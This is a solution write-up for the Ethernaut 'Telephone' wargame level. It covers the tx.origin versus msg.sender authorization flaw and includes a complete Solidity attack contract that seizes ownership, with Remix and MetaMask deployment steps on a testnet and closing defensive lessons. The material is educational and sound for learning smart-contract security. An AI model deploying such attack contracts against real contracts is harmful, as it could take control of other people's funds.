# Level 4: Telephone

## Challenge Overview

The `Telephone` challenge highlights the difference between `tx.origin` and `msg.sender`.  
The goal is to become the contract’s owner by exploiting this difference.

## Goal

- **Call the `changeOwner` function through an intermediate contract.**

## Solution

The `changeOwner` function has the following condition:

```solidity
require(tx.origin != msg.sender);
```

To bypass this:

### 1. Deploy an intermediate attack contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    ITelephone public telephone;

    // Save the victim’s address on deploy
    constructor(address _victim) {
        telephone = ITelephone(_victim);
    }

    // Call this from your wallet
    function attack() external {
        // msg.sender here is this contract,
        // tx.origin is your EOA, so the `if` check passes
        telephone.changeOwner(msg.sender);
    }
}
```

### 2. Steps to solve

1. **Deploy `TelephoneAttack` in Remix** (Injected Web3 to use Sepolia)
   - Paste the Telephone level’s contract address as the constructor argument.

2. **In Remix’s Deployed panel**, you’ll see two buttons:
   - `telephone()` (blue) — returns the stored target address  
   - `attack()` (orange) — invokes your exploit

3. **Click `attack()`** (confirm in MetaMask).

4. **Back in Ethernaut’s console, check**:

```javascript
await contract.owner()  // should now equal your wallet address
```

---

## Lessons Learned

- Avoid using `tx.origin` for authorization, as it can be manipulated.
- Use `msg.sender` to validate the immediate caller.
